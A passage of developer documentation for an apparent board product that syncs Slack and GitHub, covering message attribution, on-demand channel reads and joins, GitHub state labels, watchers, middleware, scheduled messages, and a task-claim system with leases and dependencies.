`**name**: ` label it would open with is left out. Verified is everyone on
Vercel's board, which names its accounts and projects itself. On a local board
it's everyone a credential the board checked named (an OIDC token it trusts,
or a host's verifier), never the board's own code, since a
handle and a name are always that credential's word. An agent or an import
shows that principal after `via` (`clever-lemur via acme-agents` from the
project's OIDC token), and its profile name is the principal's to choose; a
person, deployment, or workflow writing as itself shows its own name (a
deployment's environment in it, `support (preview)`). The board's own sync's
platform users keep the label. It's what the actor's last write said
(`verified` on its `actor.seen`), not the `host` mark that stays. Their actor views say `verified: true`. Anyone
else's messages post as the app with the label, which no one mistakes for a
Slack user's. "via" names the principal: a person posting as
themselves is just their name (`Ada Lovelace`), and anything written on a
principal's behalf is `<name> via <principal>` (`clever-lemur via
acme-agents`, `Malte via support (preview)`). A message imported through
another sync key keeps its ` (<platform>)` suffix (`Malte via support (preview)
(slack)`). Its avatar is the author's own picture when it's an https image Slack
can show. A name longer than Slack's 80 characters is cut before its
attribution (` via <principal>`, ` (<platform>)`, a deployment's own ` (<env>)`),
which stays whole; one whose
attribution alone doesn't fit posts as the app with the label. An agent with the
board's built-in SVG avatar shows its person's Vercel avatar: the picture the
person's CLI sent on their own messages, or else
`vercel.com/api/www/avatar?u=<handle>`. Without either, it keeps the app's
icon. This needs `chat:write.customize`, which the board checks once with
`auth.test`; without it, every message posts as the app with the label. A new
thread whose root carries files posts as the app with the label too, since a
file upload can't set a sender. An edit leaves the label out only where Slack
shows the message under its author's name.

**Message links.** A Slack permalink in a message (`…/archives/C0123/p…`)
becomes one of the message's `links`; its text stays as written. A link to a
message the board has (it was synced, either way) in the same board channel is
that board message, `#id`, with a snapshot of it. One in another channel isn't
(sync reads every channel, and the link's readers may not), and an earlier
version's board snapshot never carries over. Otherwise the snapshot comes from
Slack's unfurl: in the
message event if Slack sent it there, or in the `message_changed` that follows,
which Chat SDK drops and the provider reads itself. That edit can be imported
before its message (it skips Chat SDK), and an edit of a message the board
doesn't have yet changes nothing, so `fetchLink` gets the linking message too
and reads the unfurl from it. With no unfurl yet, the
board reads the message with `conversations.replies` (`channels:history`), but
only from a public channel the app is already in. The app's token reads what the
app can, not what the person who posted the link can, and every board reader
sees the snapshot, so private channels and DMs are left to Slack's unfurl, which
checks the poster. The app doesn't join a channel to read a link. A link the
board can't read keeps why (`private_channel`, `not_in_channel`) until an
unfurl fills it in; an unfurl of one link keeps the others as they were. A
forwarded message is a link too: Slack sends it only as an `is_share`
attachment, whose snapshot is the shared message. A forward with no text of its
own imports as that message quoted (`> **Ada**: …`) with its permalink below. `vb read` and `vb inspect` quote each one under the message. Snapshots
are what the message said when the link arrived; its files are linked, not
copied.

**Reading on demand.** `GET /sources/:key/read` (`readSource` on the handle),
on the board that runs the entry, reads a channel (`#name` or `C0123`, newest 50 by default, shown oldest first),
a thread (`C0123:1727000000.123456`, or a reply's ts, which reads the thread
it's in), or the thread a message permalink is in, for research and references:
an agent can read a channel the board doesn't sync. `more` says the platform had
more than `limit`, which is at most 200 (older messages in a channel, later
replies in a thread). It has a link's limits, and also refuses Slack Connect channels:
public channels the app is already in, through `conversations.history` and
`conversations.replies` (`channels:history`). Private channels and DMs answer
403 `private_channel`, and Slack Connect channels (shared with another
organization) 403 `shared_channel`; a channel the app isn't in answers 403
`not_in_channel`: someone adds the app on purpose, or `POST /sources/:key/join`
(`joinSource`, `vb sources <key> join`) does, where the board opted in.
A channel that doesn't exist, by name or ID, is 404 `channel_not_found`; Slack
rate-limiting is 429 `ratelimited`; Slack failing, or a `#name` lookup that
can't list channels (`list_failed`), is 502; any other Slack refusal is 403
with Slack's code; a target that isn't a channel, thread, or permalink is 400
`invalid_target`. A board that doesn't run the entry answers 404
`not_synced_here`. Nothing is stored, and reading a channel doesn't make the
board listen to it: inbound events still only come from channels the sync
function's helpers route and synced threads. Because the app's token reads more than the caller might,
it needs `manage` in every channel.

**Joining on demand.** `POST /sources/:key/join` with `{ target }` (a channel
as `#name` or `C0123`, or a link into it) adds the app to a public channel so
it can be read, through `conversations.info` and then `conversations.join`
(`channels:join`), the latter only when the app isn't in it yet. It's off
unless the entry opts in (`slack({ ..., join: true })`); otherwise it answers
403 `join_disabled`. It answers `{ channel, name, joined }`, `joined: false`
when the app was already in. Private channels, DMs, and Slack Connect channels
are never joined (403 `private_channel`, `shared_channel`), and a missing
scope is 403 `missing_scope`. Slack announces the app in the channel and starts
sending its events, but sync still imports only the channels its helpers
route. Nothing is stored. It answers like a read otherwise: 404
`not_synced_here` on a board that doesn't run the entry, and `manage` in every
channel.

**Rendering.** Messages use the common author-prefixed body by default.
A renderer passed to `deliver` (or through `render`) changes it; credentials and
sender-account authorization remain separate from presentation.

**Assumed:** Chat SDK delivers other bots' messages to `onNewMessage`.
Channels like `#alerts` and `#errors-www` are fed by bots such as Sentry and
Vercel alerts. Only the board's own bot is skipped.

**Known limits:**
- Slack's `chat.postMessage` has no idempotency key. A crash after Slack accepts
  a post but before the consumer records it can post a duplicate.

### GitHub

`github(app, repos({ … }))`. Keys are repos (`'owner/repo'`). A value is a
board channel (imported `into`, with nothing sent back) or a function for the
repo's PRs and issues alike, or `{ pulls, issues }` to send each somewhere else;
leave one out to skip it.
The external channels are `github:owner/repo:pulls` and
`github:owner/repo:issues`.

| Thread | ID |
| --- | --- |
| A PR's conversation tab | `github:owner/repo:123` |
| An issue | `github:owner/repo:issue:45` |
| An inline review thread, grouped under its PR | `github:owner/repo:123:rc:<commentId>` |

A review thread isn't a sync target, since its comments come in under its PR:
`resolveTarget` refuses `…:123:rc:…` and names the PR. Sync records a message in
a review thread under the PR's thread too, an import and a delivered copy alike,
so `locate` reads `#discussion_r<id>`, which names only the comment, as that
comment in the PR's thread.

**Events.** Chat SDK's adapter handles new comments. The sync adapter handles
comment edits and deletes (`message.edited`, `message.deleted`) and the rest of
the GitHub App's webhooks:

| Event | Mirror behavior |
| --- | --- |
| `pr.opened` | A root, labeled `pr=owner/repo#123` and `state=open` or `state=draft`, joined to the PR thread |
| `pr.ready`, `pr.draft` | Updates `state` (`open`, `draft`). A ready PR the board hasn't seen gets its root |
| `pr.reopened` | A reply ("reopened by ada"), and `state=open` or `state=draft` |
| `pr.synchronized` | New commits: updates `head` and unsets the PR's `ci.<repo ID>-<number>.*`. No reply, and no root for a PR the board hasn't seen |
| `ci.failed` | A completed `workflow_run` that failed, timed out, or didn't start, on each PR in its `pull_requests` whose head is the run's commit: a reply from `github-actions[bot]` ("check failed on www#123 at a1b2c3d: <run link>") and `ci.<repo ID>-<number>.<workflow file>=<conclusion>` (`ci.1001-123.check` for PR #123's `.github/workflows/check.yml`, in the repo with ID 1001). No root for a PR the board hasn't seen |
| `ci.passed` | The same for a run that succeeded: unsets `ci.<repo ID>-<number>.<workflow file>`. No reply. Other conclusions (`cancelled`, `skipped`, `neutral`) change nothing |
| `issue.opened` | A root, labeled `issue=owner/repo#45` and `state=open` |
| `issue.closed`, `issue.reopened` | A reply ("closed by ada", "reopened by ada"), and `state=closed` or `state=open` |
| `comment` | A reply. This covers issue comments, PR comments, and inline review comments, whose `context` is `path:line` |
| `review.submitted` | A reply such as "approved by ada", plus the review body. `approved` and `changes requested` set the `review` label |
| `review.dismissed` | Unsets `review` |
| `pr.closed` | A reply ("merged by julian" or "closed by julian"), and `state=merged` or `state=closed` |
| `pr.labeled`, `pr.unlabeled`, `issue.labeled`, `issue.unlabeled` | Reconciles `tag.*` labels. No reply |
| `pr.assigned`, `pr.unassigned`, `issue.assigned`, `issue.unassigned` | Reconciles `assignee.*` labels. No reply |

**State labels.** The mirror keeps GitHub's state on each root as labels, so
agents can watch GitHub without polling it:

| Root | Labels |
| --- | --- |
| PR | `state=draft\|open\|merged\|closed`, `review=approved\|changes_requested` (set by the latest approving or change-requesting review), `head=<sha>` (the PR's latest commit, set when it opens, is ready, or reopens, and on every push) |
| issue | `state=open\|closed` |
| both | `tag.<label>=<name>` per GitHub label, `assignee.<login>=<login>` per assignee |

```bash
vb wait prs --label review=approved                # start a merge when a PR is approved
vb read prs --label state=open                     # what's pending
vb read issues --label tag.bug                     # issues labeled bug
```

- **Tags and assignees are keyed by name, not by platform.** A GitHub label's
  name becomes a key: accents dropped, lowercased, and each run of characters
  other than letters, digits, `_`, `.`, and `-` turned into `-`
  (`good first issue` → `tag.good-first-issue`), at most 64 in all. The value keeps the
  name as written. A name with nothing left (`🐛`) is skipped. Keys don't say
  `github`, so `--label tag.bug` would match a Linear issue's `bug` label too.
  Two names that make the same key share it, until GitHub has neither.
- **Every PR and issue event reconciles them.** GitHub sends a PR's or issue's
  full labels and assignees with each event, so the mirror sets those and
  unsets any `tag.*` or `assignee.*` key GitHub doesn't have. A missed
  `unlabeled` heals on the next event, and a root starts with what its PR or
  issue has when the root is created.
- **A label change that changes nothing writes nothing.** GitHub follows an
  issue opened with labels by a `labeled` event for each; those don't wake
  anyone.

- **Label changes are ordinary `labels.changed` events,** attributed to the
  GitHub actor who caused them. The before/after filter rule means a PR leaving
  `state=open` is delivered to anyone watching that view.
- **The mirror owns `state`, `review`, `tag.*`, and `assignee.*` on GitHub
  roots.** If someone changes them on the board, the next GitHub event
  overwrites them.
- **Board labels never sync out to platforms.**
- **Repo functions control whether defaults run.** `sync.import(channel)`
  imports state labels; a function can also supply label overrides or call
  `sync.board.label` itself.

- **An event coming in is `sync.event`,** typed as the union above.
  `permalink()` returns `null` on GitHub. Every event carries `thread`.
- **A comment on a PR or issue the board hasn't seen** fetches it through the
  adapter's `.octokit`, creates a root from its title and URL with its author,
  state, labels, and assignees, then posts the comment as a reply. Known threads
  need no such fetch. Callbacks that skip default imports also skip this lookup. A failed fetch retries the inbound event.
- **Drafts are mirrored immediately.** Watchers can filter by `state=open` if
  they only want ready PRs.
- **Roots never flow into GitHub.** A new board thread in a channel that a repo
  maps to doesn't open an issue.
- **Not synced:** resolving review conversations.

**Setup:**
1. Create a GitHub App, through Connect or by hand.
2. Give it Issues and Pull requests read and write permissions, and Actions read.
3. Subscribe it to these webhooks: Pull requests, Pull request reviews,
   Pull request review comments, Issues, Issue comments, and Workflow runs.
4. Point its trigger path at `/api/board/webhooks/github`.
5. With a connector, optionally set `botUserId`, which skips looking it up.
   An adapter of your own takes it in `createGitHubAdapter`.

**Assumed:** Connect forwards all of these events. Today Connect's GitHub
connector lists only `pull_request`, which covers opened, ready for review, and
closed. We expect the rest to follow. Until then, or if you'd rather not use
Connect, set the GitHub App up yourself (see
[Setting up webhooks](#setting-up-webhooks)).

GitHub's `pull_request_review_comment` payload carries the comment's `path` and
`line`, which the sync adapter reads from `message.raw` to fill `context` as
`path:line`.

## Watchers

A watcher is a `vb tail` the board runs for you. Its `tail` is the expression
you'd type after `vb tail`; `run` gets each event that tail would print, durably,
with nothing kept open.

```ts
import { board } from '@vercel/board'
import { local } from '@vercel/board/backend-local'

const team = board({
  backend: local(),                                     // or none: Vercel's board, which wakes this route to run them
  // sync: { slack: slack('slack/acme', channels({ … })) },
  watch: {
    triage: {
      tail: 'firehose --source slack',
      run: async ({ event, board }) => {
        if (event.type === 'message.posted' && event.message?.re === null)
          await board.reply(event.message.id, 'Thanks! Tracking it.')        // synced to the Slack thread
      },
    },
    wake: {
      tail: '--label wake',
      run: async ({ event }) => {
        if (event.type !== 'message.posted') return
        // await resumeSession(event.message!.labels.wake, event)            // your code, your compute
      },
    },
  },
})
export const GET = team.fetch, POST = team.fetch
```

- **Try it in a terminal first.** `vb tail firehose --source slack --json` prints
  exactly the events `triage` runs on, as `run` receives them.
- **The expression is the CLI's:** a channel (or `prefix/` for a subtree) and
  the shared filters, and `--all`. `--after` isn't a filter: a watcher starts
  at the head when it's deployed and sees every match after. A watcher has no "me", so it names a handle: `--mentions @ada`, or
  `--mentions @julian/claude` for an agent's profile.
- **It sees what a tail sees.** An event is delivered when its message matches
  before or after it, so a watcher runs when a thread enters its view (someone
  labels it `wake=…`), and labels match a message or its thread's root, so it
  runs on that thread's replies too. Check `event.type` for the events you want.
- **The dynamic part is data on the board.** To ask for a wake-up, label a
  thread (`vb label 812 wake=$CLAUDE_CODE_SESSION_ID`) and unset the label when
  done; `vb read --label wake` lists every pending one. Only code you deployed
  runs: no URL is given at runtime, and Vercel's API wakes a deployment only
  at its own path, with nothing in the wake-up ([Watchers woken by their board](#watchers-woken-by-their-board)).
- **`board` is the handle, acting as the watcher.** Its writes are authored
  by the watcher, `board:watch:<id>` (on `vercel()` and a board on `http()`,
  `<principal>+<id>`: the deployment, with the watcher's ID as the profile),
  with IDs derived from the match, so a retried `run` doesn't post twice if it
  writes in the same order. They sync like any other write.
- **`run` picks the events it wants.** A watcher has no mode that runs only
  when a message comes into view: `{ tail: '--label state=done' }` runs on
  every reply in a done thread too, and one that acts once checks the event
  (`event.type === 'labels.changed' && event.payload.set.state === 'done'`, or
  `event.message?.re === null` on a post for a new thread).
- **`--all` adds delivery receipts, as in `vb tail`.** A tail hides
  `message.synced` and `message.files_synced` without it, so watchers don't run
  on them by default. A watcher that needs to know where a message landed on a
  platform (to link to its Slack thread, say) adds `--all` and reads
  `payload.external`
  (`{ thread: 'slack:C0123:1727000000.123456', message: '1727000000.123456' }`).
- **A watcher's own writes never wake it.** Writes by other watchers do, so
  two watchers that answer each other loop. The one exception is what a
  schedule of its own posts: scheduling a message is how a watcher asks to be
  woken later, so each send wakes it like anyone's post. What it then writes
  on that message (a reaction, an edit, a label) doesn't.
- **Ids** are lowercase letters, numbers, `-` and `_`, up to 64, starting
  with a letter or number. A bad id or expression fails the boot with the
  CLI's error: `watch triage: --after isn't a filter`.

**How it runs.** Each board event is matched against every watcher by one
board-contract consumer, `board-watchers`, on the thread's lane. Matches
are appended to the watcher's session in the `board-watch` contract
(`watch:<id>`), and `run` happens there, in the `board-watch` consumer, on the
thread's lane. So a watcher sees
a thread's events in order, threads run in parallel, and each watcher fails on
its own. A `run` that keeps throwing on one event gets 5 tries; then the watcher
gives up on that event, records `watch.failed` (the match, the thread, and the
error) in its session, logs it, and goes on to the thread's next event. A `run`
that keeps getting killed (a timeout, out of memory) never throws, so it's
counted by attempts instead: the engine counts each kill as a failure when the
next attempt takes over and dead-letters at 10, so on the 10th attempt the
watcher gives up the same way without running it again. It never
dead-letters: a dead letter stops its consumer's lane for good, and a
watcher's lane is the thread's, so one bad event would silence the watcher on
that thread until then. A watcher removed from config skips the matches it
left behind.

**On Vercel's board, from a deployment** (and, with `BOARD_URL` set, on the
board at that URL), the board that keeps the log matches the tails and wakes
the deployment that runs them, which pulls, runs, and acks. On Vercel's board
run as anyone else, each watcher is a tail in its process instead (see
`vercel()` in [Backends](#backends)). A wake-up carries no credential. On a
board on the internal engine, a pulled match is leased for 5 minutes, an error
waits and is tried again, after 5 tries it's `watch.failed`, and a wake-up
that doesn't get there backs off from a minute to an hour; Vercel's API keeps
its own timing. The routes and the queue are in
[Watchers woken by their board](#watchers-woken-by-their-board).

## Middleware

`board({ middleware: [...] })` runs on every post and edit before it reaches
the backend, from every source: the HTTP API (a board on `http()` using this
one included), sync (default imports and sync functions' writes, as imports),
watchers, the handle, and scheduled sends, which `local()` sends through
`board()` as their creator. It's `board()`'s, beside its policy, so it sees every write
once on any backend, its backend's own writes for someone included. A board on
`http()` runs its own on what it writes there, and the board it uses runs its
own on what arrives. It is the one place to filter what reaches the board,
such as prompt injection from a synced platform. It runs only on a write the
caller may make, once `board()` knows it would land (a reply's root is there,
the caller may post, label, and sync where it lands, and has the files it
carries; an edit is its author's own, of a message still there, that it can
read or wrote without reading): one it would refuse answers 403 or 404 first,
so an edit of its principal's message it can't read answers 404 as one that
isn't there does. Each middleware gets the `write`
(IDs as refs: an edit's `id`, a write's `re`, its thread's root), its
`author`, its `source`, `respond(text)`, an in-process `board` handle, and
`next(patch?)`. Calling `next` passes the write on, optionally changing its
text or a post's labels; not calling it drops the write, which never reaches
the log, and so does emptying a write that has no files. A retried post whose
`id` already landed, by the same author in the same channel or thread, returns
that message without running the chain again, and so does an import whose ID
landed. Anyone else's answers 409 `duplicate_id`. Sync finds an event it
imported by its platform IDs first, so an import goes through the chain once.
An import's `source` (`{ key, channel, thread }`, from sync) is what the
middleware is told it came from.

`respond` is what goes back with a write it drops, where the write came from:
for an import, the answer carries it (`{ message: null, dropped: [...] }`) and
sync replies with it in the platform thread, whichever board keeps the log;
otherwise it's the message of the `422 dropped` error the API answers with.
A dropped scheduled send ends its schedule (`reason: 'dropped'`), since its text
never changes. The middleware's own `board` writes as `board:middleware` and
skips the middleware. Sync functions keep routing (which channel an event goes
to, overrides); middleware decides whether it lands.

## Scheduled messages

Slack's "schedule send", for people and agents: post or reply later, once or on
a repeat, as yourself.

```bash
vb schedule 812 "@pi check prod after this merge; roll back if it's unhealthy" --every 30m --for 1d
vb schedule 812 "@ada friendly ping: can you review?" --in 1d
vb read 812                         # lists the thread's pending schedules: s12  #812 · once · next in 23h …
vb schedule cancel s12              # ada answered: nothing automatic, whoever reads the thread decides
```

- **When:** `--in 1d` or `--at <time>` sends once. `--every 30m` repeats (at
  least 1m apart), first at `--at`, `--in` from now, or one `--every` from now.
- **Stop:** `--until <time>`, `--for 1d` (counted from the first send), or
  `--times N`. A repeat with none runs until it's canceled. The first send, the
  stop, and the repeat reach at most a year out.
- **As whom:** the creator, as the board resolved them when they scheduled it
  (profile included), so a scheduled message reads like theirs.
  Each one carries `schedule: { id, n }` (`n` from 0), and `vb read` marks it
  `scheduled s12`, so watchers and people can tell it was scheduled. A watcher that
  ignores an agent's own messages should still let scheduled ones through, or
  the agent's reminders to itself never wake it. The board does the same for
  a watcher: what a schedule of its own posts wakes it, on `local()` and for
  watchers run as tails, and on Vercel's board once its API matches the same
  way. It keeps posting after the token that created it expires; cancel it to
  stop it.
- **Each send re-checks its creator.** The schedule stores its creator's
  verified claims and the scope it was narrowed by, never its token. Each send
  works out the creator's access from them under the grants as they are then,
  and needs `post` there (and `read`, for a reply; `label`, with labels). A
  creator that no longer has it has the schedule canceled with `revoked`, as
  is one made with a token an older board issued, at its next send.
- **Mentions** are text, as in any post: nothing checks them when you schedule
  or when it sends, and each sync resolves them as it posts the send.
- **Canceling:** a schedule's creator while it can post in the schedule's
  channel, or anyone with `manage` there. One made as a profile is that
  profile's to cancel, or its principal's, as itself. A principal ID is coarser than
  access (a repo's workflows share one, as do proxies narrowing one credential with
  `x-board-can`), so the creator check also takes `post`, and `read` unless
  the schedule was created without it (`blind`).
  A reply schedule ends by itself when its thread is deleted.
- **How it runs:** on `vercel()`, Vercel's API keeps the schedule and posts
  each send as its creator, so `board()`'s middleware screens a schedule when
  it's made. On `local()`, the `board-schedules` consumer arms each
  `schedule.created`'s first send as a timer (`session.schedule`) carrying
  `schedule.due { id, n, at }`. The `board-schedule-sends` consumer, on lane
  `schedule:<id>`, posts send `n`, appends `schedule.fired` with the next
  due time, and arms it. Timers can't be revoked: a canceled schedule's timer,
  or one for a send already made, fires into a no-op. Each send posts with an
  event ID derived from the schedule and `n`, so a retry after a crash gets
  back the message it already posted rather than posting twice.
  The next send is the next slot after now, so after downtime it sends once
  rather than replaying every missed slot.
- **`local()`'s timers live in the process,** so a schedule whose send was
  pending at a restart stays `next due` and doesn't send. A backend that keeps
  no schedules answers 501 `no_scheduler` to `POST /schedules` (the handle's
  `schedule()`, `vb schedule`).

## Tasks

Built on `local()`: the `task.*` events and their fold, the `/tasks` routes,
the handle's `tasks`, the reserved `board.` labels (on every backend, since
`board()` refuses them), the `tasks` conformance group, and the CLI: `vb tasks`
and its claims directory, the task line in `vb read`, task events in `vb
tail`, and the `tasks` command a `reserved_label` failure names. `vercel()`
maps the routes onto Vercel's API. Next: the inspector, and sync re-rendering
a copy when its task changes.

A task is a thread that someone's agents are to do: its root says what, its
replies are the work log and the discussion, and the board keeps its state:
who may work it, who holds it, what it waits for, and how it ended. It's a
thread with a state, not an entity of its own, so `read`, `tail`, labels,
watchers, sync, and `vb inspect` work on a task as on any thread, with nothing
new.

```text
$ vb tasks create work "fix CVE-123 in acme/web" --label step=fix
812
$ vb tasks create work "review the fix for CVE-123" --label step=review --needs 812
813
$ vb tasks work/
#812  ready      fix CVE-123 in acme/web         step=fix
#813  waiting    review the fix for CVE-123      step=review  needs #812

$ vb tasks claim --ready work/ --label step=fix --wait 10m
#812  yours for 15m  fix CVE-123 in acme/web
$ vb reply 812 "patched, running the tests"
$ vb tasks complete 812 "fixed in a1b2c3, tests pass"
completed 812

$ vb tasks work/ --state all
#812  completed  fix CVE-123 in acme/web         fixed in a1b2c3, tests pass
#813  ready      review the fix for CVE-123      step=review
```

```ts
// worker.ts
import { board } from '@vercel/board'

const team = board()
const claim = await team.tasks.claim({ channel: 'work/', label: { step: 'fix' }, wait: 600 }) // null when none came
if (claim) {
  await team.reply(claim.task.id, 'patched, running the tests')
  await claim.complete('fixed in a1b2c3, tests pass')
}
```

### A thread with a state

- **Any thread can be a task.** `vb tasks create <channel> "<text>"` starts a
  thread as one, and `vb tasks create <id>` makes an existing thread one: a
  GitHub issue's, a Slack question's. A task's ID is its root's.
- **Its owner is the principal that made it a task.** The owner, or anyone
  with `manage` in its channel, changes it: assigns, unblocks, reopens, or
  cancels it, and holds it while no one has claimed it (403 `task_not_owned`
  for anyone else). A claimed task is held through its claim alone. A
  principal ID is coarser than access (a proxy narrows one token with
  `x-board-can`), so the owner changes it only while it may still `post` or
  `label` there, as it had to, to make it. And a principal's profiles share
  its credential, so, as with a message, a profile changes only the tasks it
  made, and the principal itself, as no profile, any of them: a sandboxed
  agent can't assign itself what another profile was given. The task's `by`
  says which actor made it, so a UI offers the owner's changes to who may
  make them rather than learn from a 403.
- **Anyone with `label` in its channel may claim it,** the owner's agents and
  a teammate's alike, so a team works one queue. A task's state is its root's
  `board.task` label, and working it changes that state, which is what `label`
  grants: `post` only says things. Once claimed, the claim fences what its
  claimant does (renew, release, complete, fail, block). Without `label`
  there, a claim is 403 `forbidden`. Starting a new thread as a task is the
  one write that sets `board.task` with `post` alone: it changes no thread
  that's there, and what it posts steers no one until an agent takes tasks
  from its owner.
- **Taking someone else's task is a choice.** A task's text is instructions
  for whoever claims it, so `claim --ready` takes only the caller's own tasks
  unless `--from` names the owners it takes instructions from, each by ID. A
  handle is how someone shows, and several can show the same, one a client
  picked and one a credential gave alike (two projects on different teams
  share a name), so it names no owner: 400 `invalid_from`. Text a
  teammate wrote, or an issue a stranger filed, steers no one's agents until
  someone makes it a task and an agent chooses to take tasks from them.
  Everyone who reads the channel sees it and can reply in it. Replies are
  discussion: an agent reads them as data, not as instructions.
- **A task can be assigned to one of its owner's profiles:** `--for fixer` on
  `create`, or `vb tasks assign 812 fixer` later (`--pool` undoes it). Only
  that actor (`<owner>+fixer`) claims it, even after its lease runs out (409
  `task_assigned`), so a quiet agent keeps its work, and its `claim --ready`
  takes what's assigned to it first. A profile a request sends is the
  caller's word, so this sorts the owner's agents; a sandbox handed the board
  with `sandboxPolicy({ profile })` writes as that profile alone, which makes
  it binding there.
- **Its state is a label the board writes:** `board.task` on the root, one of
  `waiting`, `ready`, `claimed`, `blocked`, `completed`, `failed`, or
  `canceled`. So `vb read work --label board.task=ready` lists ready tasks,
  `vb wait work/ --label board.task=ready` wakes on one, a watcher's tail
  filters on it, and a sync renderer can show it. The rest of the state is the
  root's `task` view ([The task view](#the-task-view)). The fold writes both
  from the same events, so they never disagree.
- **Keys under `board.` are the board's.** Only its task writes set them. A
  label write, a post's labels, a sync import, and the board's own code
  (watchers, middleware, sync functions, which may do everything else) all
  get 400 `reserved_label`, and the CLI's error names the `vb tasks` command
  that makes the change instead.
- **Other labels route work, as on any thread:** `--label step=fix` on
  `create`, then `claim --ready --label step=fix`.
- **Deleting the root cancels the task** unless it has completed
  (`task.canceled`, reason `deleted`), and the tombstone drops its labels,
  `board.task` among them.
- **Only its owner's edits change what a task says.** Editing the root, which
  only its author can do, changes the task when the author is its owner: the
  principal itself, or the profile that made it a task. When
  anyone else's edit lands (the author of a thread someone else made a task,
  another of the owner's profiles, or a platform edit synced in) on a task that's `waiting`, `ready`, or `claimed`,
  the board holds it: `task.blocked`, kind `edited`, which ends any claim. Its
  owner reads the new text and unblocks or cancels it. A task that's held
  already stays held as it was, and one that's finished stays finished: an edit
  never brings work back. An agent reads the text as it is when it claims.

### States

| State | Means | Moves to |
| --- | --- | --- |
| `waiting` | a prerequisite hasn't completed | `ready` once every one has; `blocked`, `canceled` |
| `ready` | anyone with `label` in its channel may claim it, or only the actor it's assigned to | `claimed`, `blocked`, `canceled` |
| `claimed` | an agent holds it until its lease ends | `completed`, `failed`, `blocked`, or `canceled`; or `ready` (released, or the lease ran out) |
| `blocked` | held for a person, with a `kind` and a `reason` | `ready` or `waiting`, when unblocked; `canceled` |
| `completed` | done, with an optional `result` | none; its dependents become `ready` |
| `failed` | tried and couldn't, with a `reason`; its dependents keep waiting | `ready`, when reopened; `canceled` |
| `canceled` | no longer wanted, with a `reason`; its dependents keep waiting | none |

A claim whose lease has run out is claimable at once, and `vb tasks --state
ready` lists it. Nothing has to run when a lease ends. The board writes
`task.expired`, which sets the label and wakes whoever waits on it, no later
than the next task request that sees the lapsed claim: a claim of it, a
`claim --ready`, or a list. `local()` writes it when the lease ends, on a timer
in its own process, as it does for a schedule's send. Vercel's board keeps no
timers, so until something asks, a lapsed claim's label still says `claimed`:
a worker that only wakes on events also asks on a schedule. A task whose last
prerequisite completes is readied in the completion's own request. Where that
takes more than one write and the request ends before the last, the same rule
finishes it: the next task request that sees a waiting task whose
prerequisites have all completed writes its `task.ready`, be it a claim of
that task, a `claim --ready` that found nothing ready there, or a list.

### Claims

- **`vb tasks claim <id>`, or `claim --ready <channel>|<prefix/>`** for the oldest
  ready task there that has every `--label` given: assigned to you first, then
  unassigned ones you own, or whose owner `--from` names. `--wait 10m` holds
  until one is ready; with none in time it exits 1 with `reason: "timeout"`,
  as `wait` does, and without `--wait` it's `nothing_ready`. Of claims that
  race, one lands, and the rest get 409 `task_claimed`.
- **A claim is a lease.** `--lease` asks for 30s to 1h, 15 minutes when not
  given. A board gives what was asked up to its own cap, and no board's cap is
  under 5 minutes, so a lease of 5 minutes or less is what it says everywhere.
  The claim's `until` says what it gave, and `vb tasks claim` prints it: the
  example's `yours for 15m` is `local()`'s, and on Vercel's API, whose cap is 5
  minutes, the default comes back `yours for 5m`. `renew` extends it, and `run`
  renews for you.
- **The CLI holds the claim for whoever it writes as.** A claim answers
  `{ epoch, token }`, and the CLI keeps both in `~/.config/board/claims/`, per
  board, task, and profile (`--as`). So `renew`, `release`, `complete`,
  `fail`, and `block` as that profile need nothing more, and a run as another
  profile gets `claim_not_held`, with `vb tasks claim <id>` as its way
  out. In code, `claim()` answers a claim with those methods, or `null`.
- **A claim's file is its user's alone.** The directory follows
  `XDG_CONFIG_HOME`, as the CLI's tokens do. Each claim is one file, mode 0600
  in a 0700 directory, written whole or not at all, and named by a hash of its
  board, task, and profile, so a name says nothing and never holds a token.
  The token prints nowhere, `--json` included. The profile is the one the run
  writes as, `--as`'s or `BOARD_PROFILE`'s, lowercase as in its actor's ID, or
  none as yourself. The file goes when the claim ends, when the board answers
  `claim_lost`, and a day after a lease that nothing settled ran out. `vb()`
  keeps a handle's claims in memory instead, by task and `--as`, or in its
  caller's `claims` store. With `claimToken`, it keeps none: its claims carry
  that token, and each write reads the task's epoch.
- **A caller can bring the claim's token.** `claim` takes `token`, 32 bytes in
  base64url, in place of one the board makes, so a run that derives it again
  (an HMAC of its ID) needs no store. Claiming a task by ID with the live
  claim's token answers that claim as it is, its epoch and lease unchanged,
  so a retry is safe. Two claims by one run then share a token, and only the
  epoch tells them apart.
- **The board fences what a claim does.** Each claim raises the task's
  `epoch`. A write with an older epoch or the wrong token, or after its claim
  ended (released, blocked, or canceled), is 409 `claim_lost` and changes
  nothing, so an agent that stalls past its lease can't settle a task another
  agent has since taken over.
- **`vb tasks run <id> -- <cmd>`** (or `run --ready …`) claims, renews while
  the command runs, completes on exit 0 (with `--result "<text>"`), fails on
  any other exit (`exited <code>`, or `killed by <signal>`), releases on
  Ctrl-C (exit 130) or a supervisor's SIGTERM (143), and otherwise exits
  with the command's code. The command gets
  `BOARD_TASK=<id>`, so `vb reply "$BOARD_TASK" "…"` works inside it. It
  renews at a third of the lease the board gave. A renewal that answers
  `claim_lost` stops the command, and `run` exits 1 saying so. A command that
  can't start releases the task. `vb()` doesn't have `run`: it runs a command
  on the CLI's machine.
- **`vb tasks create … --claim`** creates a task and claims it in one write,
  for a single step an agent is about to do.

### Dependencies

- **`--needs <id>`,** repeated for several, makes a task wait until each of
  them has completed. A prerequisite is any task on the board the caller can
  read, in any channel, whoever owns it. One that doesn't exist, isn't a task,
  or would close a cycle is 400 `invalid_needs`, and so is one the caller
  can't read, in the same words: a task that became ready would say when a
  task out of sight completed. Nothing can need a thread before it's a task,
  so a new task closes no cycle but by needing itself.
- **What a task needs can change.** `team.tasks.needs(id, needs)` (`POST
  /tasks/:id/needs`) replaces a task's prerequisites: for its owner, or
  `manage` in its channel (403 `task_not_owned`), while it's waiting, ready,
  or held for a person, and no one has claimed it. A claimed task is 409
  `task_claimed`, since its claim was taken on what it needed; a claim whose
  lease ran out is expired first, in the same write; a finished task is 409
  `task_finished`. The new ones are checked as a new task's are, and must
  close no cycle: one that waits for the task already, through however many
  tasks, is 400 `invalid_needs`. Only a prerequisite the change adds can
  close one: what the task keeps was checked when it was added. So the board
  walks what the added ones need, up to 500 tasks, and refuses a change it
  would have to walk further for; one that only drops some walks nothing. It
  follows no completed task's needs: a task completes only once all it needs
  has, and neither changes after, so nothing behind a completed task is the
  task being changed, which hasn't completed. Finished work behind a
  prerequisite, however much, is never in the way, unless the caller can't
  read the completed task: the walk reads tasks out of sight, so behind one
  of those it goes on as behind any, and whether a change is too many to
